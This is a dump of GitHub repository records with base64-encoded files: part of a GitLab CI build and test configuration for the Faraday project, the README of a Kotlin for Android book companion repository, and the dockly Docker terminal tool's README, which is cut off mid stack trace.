IC0gdGFyIC16Y3ZmIGxpbnV4LWJpbmFyaWVzLnRhci5neiBvdXRwdXQKICAg
IGFydGlmYWN0czoKICAgICAgICBuYW1lOiAiJENJX0pPQl9OQU1FLSRDSV9D
T01NSVRfUkVGX05BTUUtYmluYXJpZXMiCiAgICAgICAgcGF0aHM6CiAgICAg
ICAgICAgIC0gbGludXgtYmluYXJpZXMudGFyLmd6CiAgICAgICAgZXhwaXJl
X2luOiAxIHdlZWsKICAgIG9ubHk6CiAgICAgICAgdmFyaWFibGVzOgogICAg
ICAgICAgICAtICRDSV9DT01NSVRfUkVGX05BTUUgPX4gL14uKlwvKG1hc3Rl
cikkLwogICAgICAgICAgICAtICRDSV9DT01NSVRfVEFHCiAgICAgICAgICAg
IC0gJEJVSUxEX1RFU1QKICAgICAgICAgICAgLSAkRlVMTF9URVNUCiAgICAg
ICAgICAgIC0gJERBSUxZX1RFU1QKCm1hY29zX2RtZzoKICAgIHRhZ3M6CiAg
ICAgICAgLSBtYWNvcwogICAgc3RhZ2U6IGJ1aWxkCiAgICBhbGxvd19mYWls
dXJlOiB0cnVlCiAgICBzY3JpcHQ6CiAgICAgICAgLSBwaXAgaW5zdGFsbCB2
aXJ0dWFsZW52CiAgICAgICAgLSB2aXJ0dWFsZW52IC1wIHB5dGhvbjIgZmFy
YWRheV92ZW52CiAgICAgICAgLSBzb3VyY2UgZmFyYWRheV92ZW52L2Jpbi9h
Y3RpdmF0ZQogICAgICAgIC0gZXhwb3J0IFBLR19DT05GSUdfUEFUSD0iJHtQ
S0dfQ09ORklHX1BBVEh9Oi91c3IvbG9jYWwvb3B0L2xpYmZmaS9saWIvcGtn
Y29uZmlnIgogICAgICAgIC0gcGlwIGluc3RhbGwgcHlpbnN0YWxsZXIKICAg
ICAgICAtIHBpcCBpbnN0YWxsIC0tdXBncmFkZSAtciByZXF1aXJlbWVudHMu
dHh0CiAgICAgICAgLSBweXRob24gc2V0dXAucHkgaW5zdGFsbAogICAgICAg
IC0gcGlwIGluc3RhbGwgLltndGtdCiAgICAgICAgLSBweWluc3RhbGxlciAt
RiAtdyAtLW9uZWZpbGUgLS1vbmVmaWxlIC0taWNvbj1mYXJhZGF5L2ZhcmFk
YXkvc2VydmVyL3d3dy9mYXZpY29uLmljbyBzdGFydF9zZXJ2ZXIuc3BlYwog
ICAgICAgIC0gcHlpbnN0YWxsZXIgLUYgLXcgLS1vbmVmaWxlIC0tb25lZmls
ZSAtLWljb249ZmFyYWRheS9mYXJhZGF5L3NlcnZlci93d3cvZmF2aWNvbi5p
Y28gbWFuYWdlLnNwZWMKICAgICAgICAtIHB5aW5zdGFsbGVyIC1GIC13IC0t
b25lZmlsZSAtLW9uZWZpbGUgLS1pY29uPWZhcmFkYXkvZmFyYWRheS9zZXJ2
ZXIvd3d3L2Zhdmljb24uaWNvIHN0YXJ0X2NsaWVudC5zcGVjCiAgICAgICAg
LSBweWluc3RhbGxlciAtRiAtdyAtLW9uZWZpbGUgLS1pY29uPWZhcmFkYXkv
ZmFyYWRheS9zZXJ2ZXIvd3d3L2Zhdmljb24uaWNvIGZwbHVnaW4uc3BlYwog
ICAgICAgIC0gcHlpbnN0YWxsZXIgLUYgLXcgLS1vbmVmaWxlIC0taWNvbj1m
YXJhZGF5L2ZhcmFkYXkvc2VydmVyL3d3dy9mYXZpY29uLmljbyBzZWFjaGVy
LnNwZWMKICAgICAgICAtIG1rZGlyIG91dHB1dAogICAgICAgIC0gbXYgZGlz
dC9zdGFydF9jbGllbnQgb3V0cHV0L2ZhcmFkYXktY2xpZW50CiAgICAgICAg
LSBtdiBkaXN0L3N0YXJ0X3NlcnZlciBvdXRwdXQvZmFyYWRheS1zZXJ2ZXIK
ICAgICAgICAtIG12IGRpc3QvbWFuYWdlIG91dHB1dC9mYXJhZGF5LW1hbmFn
ZQogICAgICAgIC0gbXYgZGlzdC9mcGx1Z2luIG91dHB1dC9mYXJhZGF5LWZw
bHVnaW4KICAgICAgICAtIG12IGRpc3Qvc2VhcmNoZXIgb3V0cHV0L2ZhcmFk
YXktc2VhcmNoZXIKICAgICAgICAtIGhkaXV0aWwgY3JlYXRlIC90bXAvdG1w
LmRtZyAtb3YgLXZvbG5hbWUgIkZhcmFkYXkiIC1mcyBIRlMrIC1zcmNmb2xk
ZXIgIi4vb3V0cHV0IgogICAgICAgIC0gaGRpdXRpbCBjb252ZXJ0IC90bXAv
dG1wLmRtZyAtZm9ybWF0IFVEWk8gLW8gRmFyYWRheS5kbWcKICAgIGFydGlm
YWN0czoKICAgICAgICBuYW1lOiAiJENJX0pPQl9OQU1FLSRDSV9DT01NSVRf
UkVGX05BTUUtYmluYXJpZXMiCiAgICAgICAgcGF0aHM6CiAgICAgICAgICAg
IC0gRmFyYWRheS5kbWcKICAgICAgICBleHBpcmVfaW46IDEgd2VlawogICAg
b25seToKICAgICAgICB2YXJpYWJsZXM6CiAgICAgICAgICAgIC0gJENJX0NP
TU1JVF9SRUZfTkFNRSA9fiAvXi4qXC8obWFzdGVyKSQvCiAgICAgICAgICAg
IC0gJENJX0NPTU1JVF9UQUcKICAgICAgICAgICAgLSAkQlVJTERfVEVTVAog
ICAgICAgICAgICAtICRGVUxMX1RFU1QKICAgICAgICAgICAgLSAkREFJTFlf
VEVTVAoKZG9jdW1lbnRhdGlvbjoKICAgIGltYWdlOiBweXRob246MwogICAg
c3RhZ2U6IHBvc3RfdGVzdGluZwogICAgc2NyaXB0OgogICAgICAgIC0gYXB0
LWdldCB1cGRhdGUgLXF5CiAgICAgICAgLSBhcHQtZ2V0IGluc3RhbGwgLXkg
LW8gZGlyOjpjYWNoZTo6YXJjaGl2ZXM9IiRBUFRfQ0FDSEVfRElSIiBweXRo
b24tcGlwIHB5dGhvbi1kZXYKICAgICAgICAtIHBpcCBpbnN0YWxsIHNwaGlu
eAogICAgICAgIC0gY2QgZG9jICYmIG1ha2UgaHRtbAogICAgYXJ0aWZhY3Rz
OgogICAgICAgIHBhdGhzOgogICAgICAgICAgICAtIGRvYy9fYnVpbGQvaHRt
bAogICAgb25seToKICAgICAgICB2YXJpYWJsZXM6CiAgICAgICAgICAgIC0g
JEZVTExfRE9DCiAgICAgICAgICAgIC0gJERPQwogICAgICAgICAgICAtICRD
SV9DT01NSVRfUkVGX05BTUUgPX4gL14uKlwvKGRldnxtYXN0ZXIpJC8KCgp0
ZXN0X2h5cG90aGVzaXM6CiAgICB0YWdzOgogICAgICAgIC0gaHlwb3RoZXNp
cwogICAgaW1hZ2U6IHJlZ2lzdHJ5LmdpdGxhYi5jb20vZmFyYWRheXNlYy9m
YXJhZGF5L2ZhcmFkYXlfdGVzdGluZ19iYXNlCiAgICBzdGFnZTogdGVzdGlu
ZwogICAgYWxsb3dfZmFpbHVyZTogdHJ1ZQogICAgc2NyaXB0OgogICAgICAg
IC0gYXB0LWdldCB1cGRhdGUgLXF5CiAgICAgICAgLSBwaXAgaW5zdGFsbCB2
aXJ0dWFsZW52CiAgICAgICAgLSB2aXJ0dWFsZW52IC1wIHB5dGhvbjIgZmFy
YWRheV92ZW52CiAgICAgICAgLSBzb3VyY2UgZmFyYWRheV92ZW52L2Jpbi9h
Y3RpdmF0ZQogICAgICAgICMtIHBpcCBpbnN0YWxsIC0tdXBncmFkZSAtciBy
ZXF1aXJlbWVudHNfc2VydmVyLnR4dAogICAgICAgIC0gcHl0aG9uIHNldHVw
LnB5IGluc3RhbGwKICAgICAgICAtIHBpcCBpbnN0YWxsIC0tdXBncmFkZSBy
ZXNwb25zZXMgcHl0ZXN0LXhkaXN0IHB5dGVzdC1jb3YKICAgICAgICAtIHBp
cCBpbnN0YWxsIC0tdXBncmFkZSAtciByZXF1aXJlbWVudHNfZGV2LnR4dAog
ICAgICAgIC0gbWtkaXIgLXAgfi8uZmFyYWRheS9jb25maWcKICAgICAgICAt
IGNwIHRlc3RzL2RhdGEvc2VydmVyLmluaSB+Ly5mYXJhZGF5L2NvbmZpZwog
ICAgICAgICMtIHNlZCAtaSAncy9tYXBwZWRfdGFibGUvcGVyc2lzdF9zZWxl
Y3RhYmxlLycgZmFyYWRheV92ZW52L2xpYi9weXRob24yLjcvc2l0ZS1wYWNr
YWdlcy9mbGFza19zcWxhbGNoZW15L19faW5pdF9fLnB5ICAjIFRPRE8gcmVt
b3ZlIHdoZW4gZmxhc2tfc3FsYWxjaGVteSBmaXhlcyB0aGUgaXNzdWUKICAg
ICAgICAtIHB5dGVzdCB0ZXN0cyAtdiAtLWNvdj1mYXJhZGF5L3NlcnZlci9h
cGkgLS1jb25uZWN0aW9uLXN0cmluZz1wb3N0Z3Jlc3FsK3BzeWNvcGcyOi8v
JFBPU1RHUkVTX1VTRVI6JFBPU1RHUkVTX1BBU1NXT1JEQHBvc3RncmVzLyRQ
T1NUR1JFU19EQiAtbSBoeXBvdGhlc2lzCiAgICBvbmx5OgogICAgICAgIHZh
cmlhYmxlczoKICAgICAgICAgICAgLSAkRlVMTF9URVNUCiAgICAgICAgICAg
IC0gJEhZUE9fVEVTVAogICAgICAgICAgICAtICREQUlMWV9URVNUCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'Kotlin-for-Android-Developers',38667206,b'Companion App for the book',b'Kotlin',6,2390,,2390,False,b'https://api.github.com/repos/antoniolg/Kotlin-for-Android-Developers/forks',"IyBLb3RsaW4gZm9yIEFuZHJvaWQgRGV2ZWxvcGVycyAodGhlIGJvb2spCgpU
aGlzIGlzIHRoZSBjb2RlIHlvdSBjYW4gdXNlIHRvIGZvbGxvdyB0aGUgYm9v
ay4KCltodHRwczovL2FudG9uaW9sZWl2YS5jb20va290bGluLWFuZHJvaWQt
ZGV2ZWxvcGVycy1ib29rL10oaHR0cHM6Ly9hbnRvbmlvbGVpdmEuY29tL2tv
dGxpbi1hbmRyb2lkLWRldmVsb3BlcnMtYm9vay8pCgpBcmUgeW91IHRpcmVk
IG9mIHVzaW5nIGFuIGFuY2llbnQsIGluZXhwcmVzc2l2ZSBhbmQgdW5zYWZl
IGxhbmd1YWdlIHRvIGRldmVsb3AgeW91ciBBbmRyb2lkIGFwcHM/IERvIHlv
dSBjcnkgb3V0IGxvdWQgZXZlcnkgdGltZSB5b3Ugc2VlIGEgTnVsbCBQb2lu
dGVyIEV4Y2VwdGlvbiBpbiB5b3VyIGJ1ZyB0cmFja2VyPyBUaGVuIEtvdGxp
biBpcyB5b3VyIHNvbHV0aW9uISBBIGxhbmd1YWdlIHNwZWNpZmljYWxseSBj
cmVhdGVkIGZvciBKYXZhIGRldmVsb3BlcnMsIGVhc3kgdG8gbGVhcm4sIGV4
cHJlc3NpdmUsIG51bGwgc2FmZSBhbmQgcmVhbGx5IGludHVpdGl2ZS4gWW91
ciBwcm9kdWN0aXZpdHkgd2lsbCBib29zdCBhbmQgeW91ciBhcHBzIHdpbGwg
YmVjb21lIG1vcmUgcm9idXN0LiBMZWFybiBLb3RsaW4gdGhlIGVhc3kgd2F5
IGJ5IGV4YW1wbGUgYW5kIGRpc2NvdmVyIHRoZSB0cmlja3MgdGhhdCB3aWxs
IG1ha2UgY29kaW5nIGVhc2llci4KCkFuZCBub3csIGl0J3Mgb2ZmaWNpYWxs
eSBzdXBwb3J0ZWQgYnkgR29vZ2xlIQoKIVtLb3RsaW4gZm9yIEFuZHJvaWQg
RGV2ZWxvcGVycyBjb3Zlcl0oYXJ0L2tvdGxpbi1hbmRyb2lkLWRldmVsb3Bl
cnMucG5nP3Jhdz10cnVlKQoKIyMgQWJvdXQgdGhlIGJvb2sKCltJbiB0aGlz
IGJvb2tdKGh0dHBzOi8vYW50b25pb2xlaXZhLmNvbS9rb3RsaW4tYW5kcm9p
ZC1kZXZlbG9wZXJzLWJvb2svKSwgSSdsbCBiZSBjcmVhdGluZyBhbiBBbmRy
b2lkIGFwcCBmcm9tIGdyb3VuZCB1c2luZyBLb3RsaW4gYXMgdGhlIG1haW4g
bGFuZ3VhZ2UuIFRoZSBpZGVhIGlzIHRvIGxlYXJuIHRoZSBsYW5ndWFnZSBi
eSBleGFtcGxlLCBpbnN0ZWFkIG9mIGZvbGxvd2luZyBhIHR5cGljYWwgc3Ry
dWN0dXJlLiBJJ2xsIGJlIHN0b3BwaW5nIHRvIGV4cGxhaW4gdGhlIG1vc3Qg
aW50ZXJlc3RpbmcgY29uY2VwdHMgYW5kIGlkZWFzIGFib3V0IEtvdGxpbiwg
Y29tcGFyaW5nIGl0IHdpdGggSmF2YSA3LiBUaGlzIHdheSwgeW91IGNhbiBz
ZWUgd2hhdCB0aGUgZGlmZmVyZW5jZXMgYXJlIGFuZCB3aGljaCBwYXJ0cyBv
ZiB0aGUgbGFuZ3VhZ2Ugd2lsbCBoZWxwIHlvdSBzcGVlZCB1cCB5b3VyIHdv
cmsuCgpbVGhpcyBib29rXShodHRwczovL2FudG9uaW9sZWl2YS5jb20va290
bGluLWFuZHJvaWQtZGV2ZWxvcGVycy1ib29rLykgaXMgbm90IG1lYW50IHRv
IGJlIGEgbGFuZ3VhZ2UgcmVmZXJlbmNlLCBidXQgYSB0b29sIGZvciBBbmRy
b2lkIGRldmVsb3BlcnMgdG8gbGVhcm4gS290bGluIGFuZCBiZSBhYmxlIHRv
IGNvbnRpbnVlIHdpdGggdGhlaXIgb3duIHByb2plY3RzIGJ5IHRoZW1zZWx2
ZXMuIEknbGwgYmUgc29sdmluZyBtYW55IG9mIHRoZSB0eXBpY2FsIHByb2Js
ZW1zIHdlIGhhdmUgdG8gZmFjZSBpbiBvdXIgZGFpbHkgbGl2ZXMgYnkgbWFr
aW5nIHVzZSBvZiB0aGUgbGFuZ3VhZ2UgZXhwcmVzc2l2ZW5lc3MgYW5kIHNv
bWUgb3RoZXIgcmVhbGx5IGludGVyZXN0aW5nIHRvb2xzIGFuZCBsaWJyYXJp
ZXMuCgpbVGhlIGJvb2tdKGh0dHBzOi8vYW50b25pb2xlaXZhLmNvbS9rb3Rs
aW4tYW5kcm9pZC1kZXZlbG9wZXJzLWJvb2svKSBpcyB2ZXJ5IHByYWN0aWNh
bCwgc28gaXQgaXMgcmVjb21tZW5kZWQgdG8gZm9sbG93IHRoZSBleGFtcGxl
cyBhbmQgdGhlIGNvZGUgaW4gZnJvbnQgb2YgYSBjb21wdXRlciBhbmQgdHJ5
IGV2ZXJ5dGhpbmcgaXQncyBzdWdnZXN0ZWQuIFlvdSBjb3VsZCwgaG93ZXZl
ciwgdGFrZSBhIGZpcnN0IHJlYWQgdG8gZ2V0IGEgYnJvYWQgaWRlYSBhbmQg
dGhlbiBkaXZlIGludG8gcHJhY3RpY2UuCgojIyBWZXJzaW9ucwoKQXMgSSB1
cGRhdGUgdGhlIGJvb2ssIEkgbmVlZCB0byBwdXNoIC1mIHRoaXMgcmVwb3Np
dG9yeSB3aXRoIHRoZSBuZXcgY2hhbmdlcywgc28gdGhhdCBpdCBtYXRjaGVz
IHdpdGggdGhlIG5ldyB0ZXh0LgoKVGhhdCBtZWFucyB0aGF0IGlmIHlvdSBh
cmUgcmVhZGluZyBhbiBvbGQgdmVyc2lvbiBvZiB0aGUgYm9vaywgbWFpbiBi
cmFuY2hlcyB3b24ndCBiZSBhbGlnbmVkIHdpdGggeW91ciB0ZXh0LgoKVG8g
bWFrZSB0aGluZ3MgZWFzaWVyLCBJJ2xsIGtlZXAgdHJhY2sgb2YgdGhvc2Ug
dmVyc2lvbnMgaW4gc2VwYXJhdGVzIGJyYW5jaGVzLCB3aGljaCB3aWxsIGJl
IGxpbmtlZCBmcm9tIGhlcmU6CgotIDd0aCBlZGl0aW9uOiBGZWJydWFyeSAy
MDE5IChjdXJyZW50KQotIDZ0aCBlZGl0aW9uOiBbQXByaWwgMjAxOF0oaHR0
cHM6Ly9naXRodWIuY29tL2FudG9uaW9sZy9Lb3RsaW4tZm9yLUFuZHJvaWQt
RGV2ZWxvcGVycy90cmVlL21hc3Rlci1hcHJpbC0yMDE4KQotIFs1dGggZWRp
dGlvbjogU2VwdGVtYmVyIDIwMTddKGh0dHBzOi8vZ2l0aHViLmNvbS9hbnRv
bmlvbGcvS290bGluLWZvci1BbmRyb2lkLURldmVsb3BlcnMvdHJlZS9tYXN0
ZXItc2VwdGVtYmVyLTIwMTcpCi0gWzR0aCBlZGl0aW9uOiBKdWx5IDIwMTdd
KGh0dHBzOi8vZ2l0aHViLmNvbS9hbnRvbmlvbGcvS290bGluLWZvci1BbmRy
b2lkLURldmVsb3BlcnMvdHJlZS9tYXN0ZXItanVseS0yMDE3KQotIFszcmQg
ZWRpdGlvbjogSnVuZSAyMDE3XShodHRwczovL2dpdGh1Yi5jb20vYW50b25p
b2xnL0tvdGxpbi1mb3ItQW5kcm9pZC1EZXZlbG9wZXJzL3RyZWUvbWFzdGVy
LWp1bmUtMjAxNykKLSBbMm5kIGVkaXRpb246IEphbnVhcnkgMjAxN10oaHR0
cHM6Ly9naXRodWIuY29tL2FudG9uaW9sZy9Lb3RsaW4tZm9yLUFuZHJvaWQt
RGV2ZWxvcGVycy90cmVlL21hc3Rlci1qYW51YXJ5LTIwMTcpCi0gWzFzdCBl
ZGl0aW9uOiBNYXJjaCAyMDE2XShodHRwczovL2dpdGh1Yi5jb20vYW50b25p
b2xnL0tvdGxpbi1mb3ItQW5kcm9pZC1EZXZlbG9wZXJzL3RyZWUvbWFzdGVy
LW1hcmNoLTIwMTYpCgojIyBMaWNlbnNlCgogICAgQ29weXJpZ2h0IDIwMTkg
QW50b25pbyBMZWl2YQoKICAgIExpY2Vuc2VkIHVuZGVyIHRoZSBBcGFjaGUg
TGljZW5zZSwgVmVyc2lvbiAyLjAgKHRoZSAiTGljZW5zZSIpOwogICAgeW91
IG1heSBub3QgdXNlIHRoaXMgZmlsZSBleGNlcHQgaW4gY29tcGxpYW5jZSB3
aXRoIHRoZSBMaWNlbnNlLgogICAgWW91IG1heSBvYnRhaW4gYSBjb3B5IG9m
IHRoZSBMaWNlbnNlIGF0CgogICAgICAgaHR0cDovL3d3dy5hcGFjaGUub3Jn
L2xpY2Vuc2VzL0xJQ0VOU0UtMi4wCgogICAgVW5sZXNzIHJlcXVpcmVkIGJ5
IGFwcGxpY2FibGUgbGF3IG9yIGFncmVlZCB0byBpbiB3cml0aW5nLCBzb2Z0
d2FyZQogICAgZGlzdHJpYnV0ZWQgdW5kZXIgdGhlIExpY2Vuc2UgaXMgZGlz
dHJpYnV0ZWQgb24gYW4gIkFTIElTIiBCQVNJUywKICAgIFdJVEhPVVQgV0FS
UkFOVElFUyBPUiBDT05ESVRJT05TIE9GIEFOWSBLSU5ELCBlaXRoZXIgZXhw
cmVzcyBvciBpbXBsaWVkLgogICAgU2VlIHRoZSBMaWNlbnNlIGZvciB0aGUg
c3BlY2lmaWMgbGFuZ3VhZ2UgZ292ZXJuaW5nIHBlcm1pc3Npb25zIGFuZAog
ICAgbGltaXRhdGlvbnMgdW5kZXIgdGhlIExpY2Vuc2Uu
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'dockly',71667498,b'Immersive terminal interface for managing docker containers and services',b'JavaScript',5,2390,,2390,False,b'https://api.github.com/repos/lirantal/dockly/forks',"PHAgYWxpZ249ImNlbnRlciI+Cgk8YnI+CiAgPGltZyB3aWR0aD0iMjAwIiBz
cmM9Imh0dHBzOi8vdXNlci1pbWFnZXMuZ2l0aHVidXNlcmNvbnRlbnQuY29t
LzMxNjM3MS8yODkzNzQxNC02N2VlNWZmYS03ODkzLTExZTctOTVmOS01MDU5
Y2FjZjkxNzAucG5nIj4KCTxicj4KIEltbWVyc2l2ZSB0ZXJtaW5hbCBpbnRl
cmZhY2UgZm9yIG1hbmFnaW5nIGRvY2tlciBjb250YWluZXJzIGFuZCBzZXJ2
aWNlcwo8L3A+CgoKWyFbTm9kZSBWZXJzaW9uXShodHRwczovL2ltZy5zaGll
bGRzLmlvL2JhZGdlL25vZGUtJTNFPTcuNi4wLWJyaWdodGdyZWVuLnN2Zyld
KCkKWyFbdmlldyBvbiBucG1dKGh0dHA6Ly9pbWcuc2hpZWxkcy5pby9ucG0v
di9kb2NrbHkuc3ZnKV0oaHR0cHM6Ly93d3cubnBtanMub3JnL3BhY2thZ2Uv
ZG9ja2x5KQpbIVt2aWV3IG9uIG5wbV0oaHR0cDovL2ltZy5zaGllbGRzLmlv
L25wbS9sL2RvY2tseS5zdmcpXShodHRwczovL3d3dy5ucG1qcy5vcmcvcGFj
a2FnZS9kb2NrbHkpClshW25wbSBtb2R1bGUgZG93bmxvYWRzXShodHRwOi8v
aW1nLnNoaWVsZHMuaW8vbnBtL2R0L2RvY2tseS5zdmcpXShodHRwczovL3d3
dy5ucG1qcy5vcmcvcGFja2FnZS9kb2NrbHkpClshW0tub3duIFZ1bG5lcmFi
aWxpdGllc10oaHR0cHM6Ly9zbnlrLmlvL3Rlc3QvbnBtL2RvY2tseS9iYWRn
ZS5zdmcpXShodHRwczovL3NueWsuaW8vdGVzdC9ucG0vZG9ja2x5KQpbIVtT
ZWN1cml0eSBSZXNwb25zaWJsZSBEaXNjbG9zdXJlXShodHRwczovL2ltZy5z
aGllbGRzLmlvL2JhZGdlL1NlY3VyaXR5LVJlc3BvbnNpYmxlJTIwRGlzY2xv
c3VyZS15ZWxsb3cuc3ZnKV0oLi9TRUNVUklUWS5tZAopCgrwn4yfIEZlYXR1
cmVkIG9uIFshW0F3ZXNvbWUgRG9ja2VyXShodHRwczovL2Nkbi5yYXdnaXQu
Y29tL3NpbmRyZXNvcmh1cy9hd2Vzb21lL2Q3MzA1ZjM4ZDI5ZmVkNzhmYTg1
NjUyZTNhNjNlMTU0ZGQ4ZTg4MjkvbWVkaWEvYmFkZ2Uuc3ZnKV0oaHR0cHM6
Ly9naXRodWIuY29tL3ZlZ2dpZW1vbmsvYXdlc29tZS1kb2NrZXIpIFshW0Rl
dk9wcyBXZWVrbHldKGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vYmFkZ2UvRGV2
T3BzV2Vla2x5LSVGMCU5RiU5NSVCNi15ZWxsb3cuc3ZnCildKGh0dHA6Ly9k
ZXZvcHN3ZWVrbHkuY29tKSAKWyFbdGVybWluYWxzIGFyZSBzZXh5XShodHRw
czovL2ltZy5zaGllbGRzLmlvL2JhZGdlL1Rlcm1pbmFsc0FyZVNleHktJUYw
JTlGJTkyJUJCLWdyZWVuLnN2ZwopXShodHRwczovL2dpdGh1Yi5jb20vazRt
NC90ZXJtaW5hbHMtYXJlLXNleHkpIAoKCgohW2RvY2tseS1kZW1vLTJdKGh0
dHBzOi8vY2xvdWQuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fzc2V0cy8zMTYz
NzEvMjU2ODI4NjcvYzUyMTIyMTYtMzAyNy0xMWU3LThmMzYtNzJkMzg1MTZk
MmFmLmdpZikKCiMgSW5zdGFsbApJbnN0YWxsIHRoZSBBUEkgbW9kdWxlIGFz
IGEgZGVwZW5kZW5jeSBpbiB5b3VyIHByb2plY3Qgc28geW91IGNhbiBlYXNp
bHkgdXNlIGl0IHRvIHF1ZXJ5IE9wZXJhdGlvbnMgT3JjaGVzdHJhdGlvbiBS
RVNUIEFQSQoKYGBgamF2YXNjcmlwdApucG0gaW5zdGFsbCAtZyBkb2NrbHkK
YGBgCgojIFVzYWdlCgpKdXN0IGZpcmUgdXAgZG9ja2x5IGFuZCBpdCB3aWxs
IGF1dG9tYXRpY2FsbHkgY29ubmVjdCB0byB5b3VyIGxvY2FsaG9zdCBkb2Nr
ZXIgZGFlbW9uIHRocm91Z2ggdGhlIHVuaXggc29ja2V0OgoKYGBgCmRvY2ts
eQpgYGAKCiMjIENvbW1hbmQgbGluZSBvcHRpb25zOgoKSXQncyBhbHNvIHBv
c3NpYmxlIHRvIHByb3ZpZGUgY29tbWFuZCBsaW5lIG9wdGlvbnMgZm9yIGRv
Y2tseSB0byBjdXN0b21pemUgdGhlIGRvY2tlciBjb25uZWN0aW9uCgp8IFBh
cmFtIHwgVHlwZSB8IERlc2NyaXB0aW9uIHwKfCAtLS0gfCAtLS0gfCAtLS0g
fAp8IC1zIG9yIC0tc29ja2V0UGF0aCB8IHN0cmluZyB8IERvY2tlciBzb2Nr
ZXQgdG8gY29ubmVjdCB0byB8CnwgLS1jb250YWluZXJGaWx0ZXJzIHwgc3Ry
aW5nIHwgU3RyaW5nIHRvIGFwcGx5IHRvIGZpbHRlciBzaG93biBjb250YWlu
ZXJzIHwKfCAtaCBvciAtLWhlbHAgfCBudWxsIHwgRGlzcGxheSBoZWxwIHwK
fCAtdiBvciAtLXZlcnNpb24gfCBudWxsIHwgRGlzcGxheSB2ZXJzaW9uIGlu
Zm9ybWF0aW9uIHwKCiMjIyBgLS1jb250YWluZXJGaWx0ZXJzYAoKVGhpcyBp
cyBhIHN0cmluZyB0aGF0IGNvdWxkIGJlIHVzZWQgdG8gZmlsdGVyIHRoZSBz
aG93biBjb250YWluZXJzOwppdHMgZm9ybWF0IGlzIGluIHRoZSB4LXd3dy1m
b3JtLXVybGVuY29kZWQgc3R5bGUgYW5kIHRoZSBmaWx0ZXJzIHlvdSBjb3Vs
ZCBhcHBseSBhcmUgbGlzdGVkIGhlcmU6IFtodHRwczovL2RvY3MuZG9ja2Vy
LmNvbS9lbmdpbmUvYXBpL3YxLjM3LyNvcGVyYXRpb24vQ29udGFpbmVyTGlz
dF0oaHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL2FwaS92MS4zNy8j
b3BlcmF0aW9uL0NvbnRhaW5lckxpc3QpCgpFeGFtcGxlOiBgLS1jb250YWlu
ZXJGaWx0ZXJzPSJuYW1lPXRlc3Qmc3RhdHVzPXJ1bm5pbmciYCB0byBvbmx5
IHNob3cgKnJ1bm5pbmcqIGNvbnRhaW5lciB3aGljaCBuYW1lIG1hdGNoICp0
ZXN0Ki4KCiMgRG9ja2VyIFN1cHBvcnQKCiMjIFJ1biBmcm9tIGRvY2tlcgoK
WW91IGNhbiBydW4gZG9ja2x5IHVzaW5nIGRvY2tlcjoKCmBgYApkb2NrZXIg
cnVuIC1pdCAtLXJtIC12IC92YXIvcnVuL2RvY2tlci5zb2NrOi92YXIvcnVu
L2RvY2tlci5zb2NrIGxpcmFudGFsL2RvY2tseQpgYGAKCgojIyBCdWlsZAoK
SWYgeW91IHdpc2ggdG8gYnVpbGQgZG9ja2x5IGFzIGEgZG9ja2VyIGltYWdl
IHlvdXJzZWxmLCB5b3UgY2FuIHJ1biB0aGUgZm9sbG93aW5nOgoKYGBgCiQg
ZG9ja2VyIGJ1aWxkIC10IGRvY2tseSAuCgokIGRvY2tlciBydW4gLWl0IC0t
cm0gLS1uYW1lIGRvY2tseSAtdiAvdmFyL3J1bi9kb2NrZXIuc29jazovdmFy
L3J1bi9kb2NrZXIuc29jayBkb2NrbHkKYGBgCgojIEZBUQoKMS4gVW5zdXBw
b3J0ZWQgTm9kZS5qcyBWZXJzaW9uCgpJZiB5b3UncmUgZ2V0dGluZyB0aGUg
Zm9sbG93aW5nIGVycm9yIGluIHlvdXIgQ0xJOgpgYGAKcm9vdEBuZW86fiMg
ZG9ja2x5Ci91c3IvbG9jYWwvbGliL25vZGVfbW9kdWxlcy9kb2NrbHkvc3Jj
L3NjcmVlbi5qczozNgpjb25zdHJ1Y3RvciAodXRpbHMgPSBuZXcgTWFwKCkp
IHsKXgoKU3ludGF4RXJyb3I6IFVuZXhwZWN0ZWQgdG9rZW4gPQphdCBleHBv
cnRzLnJ1bkluVGhpc0NvbnRleHQgKHZtLmpzOjUzOjE2KQphdCBNb2R1bGUu
X2NvbXBpbGUgKG1vZHVsZS5qczozNzQ6MjUpCmBgYAoKT3IgdGhpcyBraW5k
IG9mIGVycm9yOgpgYGAKVHJhY2U6IFR5cGVFcnJvcjogT2JqZWN0LnZhbHVl
cyBpcyBub3QgYSBmdW5jdGlvbiAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgYXQg
c2NyZWVuLnRvZ2dsZU1vZGUgKC9ob21lL3Zva2llbC8ubnZtL3ZlcnNpb25z
L25vZGUvdjYuMTEuMS9saWIvbm9kZV9tb2R1bGVzL2RvY2tseS9zcmMvc2Ny
ZWVuLmpzOjE0OTozNSkKICAgIGF0IFNjcmVlbi5zY3JlZW4ua2V5ICgvaG9t
ZS92b2tpZWwvLm52bS92ZXJzaW9ucy9ub2RlL3Y2LjExLjEvbGliL25vZGVf
bW9kdWxlcy9kb2NrbHkvc3JjL3NjcmVlbi5qczoxOTA6MTIpCiAgICBhdCBT
Y3JlZW4uRXZlbnRFbWl0dGVyLl9lbWl0CiAgICAoL2hvbWUvdm9raWVsLy5u
dm0vdmVyc2lvbnMvbm9kZS92Ni4xMS4xL2xpYi9ub2RlX21vZHVsZXMvZG9j
a2x5L25vZGVfbW9kdWxlcy9ibGVzc2VkL2xpYi9ldmVudHMuanM6OTg6MjAp
